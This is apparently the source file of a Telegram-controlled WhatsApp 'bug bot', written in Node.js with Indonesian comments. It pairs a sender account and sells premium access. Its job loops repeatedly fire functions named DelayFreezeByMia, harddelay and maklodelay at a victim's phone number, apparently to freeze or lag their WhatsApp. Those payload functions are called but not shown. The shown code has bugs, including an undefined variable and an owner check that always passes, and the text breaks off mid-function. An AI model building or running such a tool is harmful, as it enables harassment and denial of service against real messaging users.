const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const mongoose = require("mongoose");
const { BOT_TOKEN, ID_TELEGRAM } = require("./config");
const adminFile = './database/adminuser.json';
const FormData = require("form-data");
const https = require("https");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 50) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ------ ( Link Raw Github ) ------ //
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/viezs1479/InfinityDBxaxa/refs/heads/main/tokens.json";

// ------ ( Create Safe Sock ) ------ //
function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

// ------ ( Pengecekan Token ) ------ //
async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);

    if (Array.isArray(response.data)) {
      return response.data;
    }

    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens;
    }

    const raw = JSON.stringify(response.data || "");
    const extracted = raw.match(/\d{5,}:[A-Za-z0-9_\-]{20,}/g);

    return extracted || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.green("🔍 Memeriksa token anda"));

  let validTokens = await fetchValidTokens();

  if (!Array.isArray(validTokens)) {
    validTokens = [];
  }

  const tokenList = validTokens.map(t => String(t).trim());

  // Normalisasi token BOT lu
  const normalizedBotToken = String(BOT_TOKEN).trim();

  // cek token
  if (!tokenList.includes(normalizedBotToken)) {
    console.log(chalk.red(`
⬡═―—―――――――――――――—═⬡⠀⠀⠀
 Akses Telah Di Tolak 
Alasan : Bot Token Belum terdaftar 
⬡═―—―――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀
`));
    process.exit(1);
  }

  console.log(chalk.green(``));
  startBot();
}



function startBot() {
  console.log(chalk.green(`
`));
console.log(chalk.yellow(`
⬡═―—――――――――――――—═⬡⠀⠀⠀
⌑ Status Bot : Connected 
⌑ Version : 2.0 Night
⬡═―—――――――――――――—═⬡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
}
validateToken();

//----------(FORMAT TARGET)-------------//
function formatTarget(number) {
  if (!number) return null;

  // bersihin selain angka
  number = number.replace(/[^0-9]/g, "");

  if (number.startsWith("0")) {
    number = "62" + number.slice(1);
  }

  return number + "@s.whatsapp.net";
}

//------------------(TASK QUE SYSTEM)--------------------//
class TaskQueue {
  constructor() {
    this.queue = [];
    this.running = false;
  }

  async add(task) {
    this.queue.push(task);
    this.run();
  }

  async run() {
    if (this.running) return;
    this.running = true;

    while (this.queue.length > 0) {
      const job = this.queue.shift();
      try {
        await job();
      } catch (e) {
        console.error("Task error:", e);
      }
    }

    this.running = false;
  }
}

const queue = new TaskQueue();

//------------------(FILTER - BEBAS SPAM)--------------------//
async function Hati(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 4; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await DelayFreezeByMia(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

async function Hati2(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 4; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await harddelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

async function Hati3(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 4; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await maklodelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

async function Hati4(ctx, target) {

  const taskId = Date.now().toString().slice(-6);
  const delay = 3000; // ini delay ms nya serah mau berapaa rekomendasi udah tetep 3000 aja sih :)

  const C = {
    reset: "\x1b[0m",
    bold: "\x1b[1m",
    green: "\x1b[32m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    yellow: "\x1b[33m",
    gray: "\x1b[90m"
  };

  const startTime = Date.now();
  const timeNow = new Date().toLocaleTimeString();

  console.log(`\n${C.cyan}${C.bold}⌛ PERMINTAAN JOBS${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Target:${C.reset} ${target}`);
  console.log(`${C.gray}Time:${C.reset} ${timeNow}\n`);

  for (let i = 1; i <= 4; i++) { // nih yang 3 itu lopp serah mau pake berapaa

    const loopStart = Date.now();

    try {
      await harddelay(sock, target); //taro Pemanggilan Function mu ingat pastikan (sock, target); jangan mention!! mau lu ubah juga gapapa serah tanya ke Ai kalo gatau

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.green}📤 Succesfuly${C.reset}  ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

    } catch (err) {

      const duration = ((Date.now() - loopStart) / 1000).toFixed(2);

      console.log(
        `${C.red}⛔ Failed${C.reset}   ` +
        `${C.gray}Loop:${C.reset} ${i}/4  ` + // nih yang 3 d sini samain aja kayak lopp muuu
        `${C.gray}Duration:${C.reset} ${duration}s`
      );

      console.log(`${C.yellow}↳ ${err.message}${C.reset}`);
    }

    await new Promise(r => setTimeout(r, delay));
  }

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);

  console.log(`\n${C.cyan}${C.bold}🏁 JOBS COMPLETED${C.reset}`);
  console.log(`${C.gray}ID:${C.reset} ${taskId}`);
  console.log(`${C.gray}Total Runtime:${C.reset} ${totalTime}s\n`);
}

const bot = new Telegraf(BOT_TOKEN);
let tokenValidated = false;
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const startSesi = async () => {
console.clear();
    console.log(chalk.cyan(`
─────────────────────
VERSION : 2.0 
STATUS : ACTIVE/TERHUBUNG
─────────────────────
`));
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '5.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `\`\`\`JS
( 🍃 ) S E N E R I T Y  N I G H T
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
\`\`\``;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "Markdown" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.green(`PAIRING SENDER BERHASIL ✅`));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "1234KUZO");
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`JS
( 🍃 ) S E N E R I T Y  N I G H T
⌑ Number: ${phoneNumber}
⌑ Pairing Code: ${formattedCode}
⌑ Type: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(FotoUtama, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`JS
( 🍃 ) S E N E R I T Y  N I G H T
⌑ Number: ${lastPairingMessage.phoneNumber}
⌑ Pairing Code: ${lastPairingMessage.pairingCode}
⌑ Type: Connected
\`\`\`
`;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}

// ------ ( Function RunTime ) ------ //
function runtime(seconds) {
  seconds = Number(seconds);

  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);

  const parts = [];
  if (d > 0) parts.push(`${d}d`);
  if (h > 0) parts.push(`${h}h`);
  if (m > 0) parts.push(`${m}m`);
  parts.push(`${s}s`);

  return parts.join(" ");
}

// ------ ( Setup File Premium ) ------ //
const PREMIUM_FILE = "./premium.json";

function loadPremium() {
  if (!require("fs").existsSync(PREMIUM_FILE)) {
    require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(PREMIUM_FILE));
}

function savePremium(data) {
  require("fs").writeFileSync(PREMIUM_FILE, JSON.stringify(data, null, 2));
}

let premiumDB = loadPremium();

// ------ ( SET COOLDOWN FILES ) -------- //

const COOLDOWN_FILE = path.join(__dirname, "db", "cooldown.json");

// ------ ( Setup File Admin ) ------ //
const ADMIN_FILE = "./admin.json";

function loadAdmin() {
  if (!require("fs").existsSync(ADMIN_FILE)) {
    require("fs").writeFileSync(ADMIN_FILE, JSON.stringify({}, null, 2));
  }
  return JSON.parse(require("fs").readFileSync(ADMIN_FILE));
}

function saveAdmin(data) {
  require("fs").writeFileSync(ADMIN_FILE, JSON.stringify(data, null, 2));
}

let adminDB = loadAdmin();

// ------ ( Helper Admin ) ------ //
function isAdmin(userId) {
  return !!adminDB[userId];
}

function addAdmin(userId) {
  adminDB[userId] = true;
  saveAdmin(adminDB);
}

function delAdmin(userId) {
  delete adminDB[userId];
  saveAdmin(adminDB);
}

function isOwnerOrAdmin(userId) {
  return userId == ID_TELEGRAM || isAdmin(userId);
}

// ------ ( Helper Premium ) ------ //
function isPremium(userId) {
  return !!premiumDB[userId];
}

function addPremium(userId, expired) {
  premiumDB[userId] = expired;
  savePremium(premiumDB);
}

function delPremium(userId) {
  delete premiumDB[userId];
  savePremium(premiumDB);
}

function getPremiumExpire(userId) {
  return premiumDB[userId] || null;
}

// ------ ( Format Waktu Premium ) ------ //
function addDays(days) {
  return Date.now() + days * 24 * 60 * 60 * 1000;
}

function formatDate(ms) {
  const d = new Date(ms);
  return d.toLocaleString("id-ID");
}

// ------ ( Helper Untuk Menu ) ------ //
function getPremiumStatus(userId) {
  if (!isPremium(userId)) return "No";

  const exp = getPremiumExpire(userId);

  if (Date.now() > exp) {
    delPremium(userId);
    return "Expired";
  }

  return "Active";
}

// ------ ( Auto Hapus Expired ) ------ //
setInterval(() => {
  for (let user in premiumDB) {
    if (Date.now() > premiumDB[user]) {
      delete premiumDB[user];
    }
  }
  savePremium(premiumDB);
}, 60000);

// ------ ( Helper Cek Premium ) ------ //
function checkPremium() {
  return async (ctx, next) => {
    const userId = String(ctx.from.id);
    const exp = premiumDB[userId];

    if (!exp) {
      return ctx.reply(
        `<b>ACCESS DENIED</b>\n` +
        `❌ Kamu bukan user premium`,
        { parse_mode: "HTML" }
      );
    }

    if (Date.now() > exp) {
      delete premiumDB[userId];
      savePremium(premiumDB);

      return ctx.reply(
        `<b>PREMIUM EXPIRED</b>\n` +
        `⚠️ Masa aktif kamu sudah habis`,
        { parse_mode: "HTML" }
      );
    }

    return next();
  };
}

// ------ ( Helper Check Pairing Sender ) ------ //
const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

// ------ ( Command Hapus Sesi ) ------ //
bot.command("killsesi", async (ctx) => {
  if (ctx.from.id != ID_TELEGRAM) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ------ ( Command Add Admin ) ------ //
bot.command("addadmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format: /addadmin (reply)\n/addadmin 123456");
    }

    targetId = String(targetId);

    addAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚 
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD ADMIN ERROR:", err);
    ctx.reply("❌ Error addadmin");
  }
});

// ------ ( Command Del Admin ) ------ //
bot.command("deladmin", async (ctx) => {
  try {
    if (ctx.from.id != ID_TELEGRAM) {
      return ctx.reply("❌ Hanya Owner yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);
    let targetId;

    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply("❌ Format:\n/deladmin (reply)\n/deladmin 123456");
    }

    targetId = String(targetId);

    delAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("DEL ADMIN ERROR:", err);
    ctx.reply("❌ Error deladmin");
  }
});

// ------ ( Command Add Premium ) ------ //
bot.command("addprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;
    let days;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
      days = parseInt(args[0]);
    } 
    // mode ID manual
    else {
      targetId = args[0];
      days = parseInt(args[1]);
    }

    if (!targetId || !days) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /addprem 30\n" +
        "ID: /addprem 123456789 30"
      );
    }

    const expired = Date.now() + days * 86400000;

    premiumDB[targetId] = expired;
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙈𝙖𝙨𝙖 𝘼𝙠𝙩𝙞𝙛 : ${days} 
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD PREMIUM ERROR:", err);
    ctx.reply("❌ Error addpremium");
  }
});

// ------ ( Command Del Premium ) ------ //
bot.command("delprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } 
    // mode ID
    else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /delprem\n" +
        "ID: /delprem 123456789"
      );
    }

    if (!premiumDB[targetId]) {
      return ctx.reply("❌ User bukan premium");
    }

    delete premiumDB[targetId];
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("DEL PREMIUM ERROR:", err);
    ctx.reply("❌ Error delpremium");
  }
});

// ------ ( Command Cek Premium ) ------ //
bot.command("checkprem", async (ctx) => {
  const target = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from
    : ctx.from;

  if (!isPremium(target.id)) {
    return ctx.reply("❌ User bukan premium");
  }

  const expired = getPremiumExpire(target.id);

  return ctx.reply( `\`\`\`JS
✘ 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙩𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 : ${formatDate(expired)}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
    { parse_mode: "HTML" }
  );
});

// ------ ( Thumbnail Foto Menu ) ------ //
const FotoUtama = "https://n.uguu.se/RpdhmPFp.jpg";

let groupOnly = true // default aktif (langsung block private)

// =================
// Middleware (AUTO FILTER)
// =================
bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  const isPrivate = ctx.chat.type === 'private'
  const cmd = text.split(' ')[0].replace('/', '').toLowerCase()

  // =========================
  // 🔒 GROUP ONLY (NO BYPASS)
  // =========================
  if (groupOnly && isPrivate) {
    return ctx.reply('❌ Mode Group Only aktif\nGunakan command di group')
  }

  // =========================
  // OWNER CHECK (HANYA UNTUK CONTROL)
  // =========================
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

